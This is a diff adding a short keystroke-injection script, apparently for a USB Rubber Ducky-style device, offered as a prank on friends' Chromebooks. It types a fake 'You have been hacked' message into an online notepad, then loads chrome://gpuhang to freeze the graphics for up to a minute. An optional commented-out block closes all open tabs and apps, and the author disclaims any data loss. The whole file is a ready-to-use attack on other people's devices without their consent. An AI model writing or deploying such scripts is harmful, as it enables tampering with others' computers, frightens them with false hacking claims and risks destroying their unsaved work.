@@ -1,0 +1,31 @@
+REM A script to prank your friends and freeze their chromebooks
+REM Not one hundred percent sure this works on enrolled chromebooks, depends on settings really, give it a shot
+REM this will freeze their chromebook for up to a minute before it comes back (this only freezes the gpu so proccesses still run in the background)
+
+
+REM (uncomment to enable) closes all webpages and apps make sure they arent working on anything important (i am not responsible for any lost data or any thing of the sort)
+REM CTRL w
+REM REPEAT 15
+REM DELAY 1500
+
+REM Open note site (rapidtables) (chromeOS doesnt have an official one)
+CTRL t
+CTRL l
+STRING https://www.rapidtables.com/tools/notepad.html
+DELAY 750
+ENTER 
+DELAY 250
+STRING AHAHAHAHAHA! You have been hacked
+DELAY 650
+ENTER 
+STRING Here it comes buddy, prepare. TO. FREEZEEEEEEEEEEEEEE
+DELAY 550
+
+REM Freeze chromebook (GPU)
+DELAY 150
+CTRL l
+STRING chrome://gpuhang
+DELAY 450
+ENTER 
+
+REM Mayhem complete
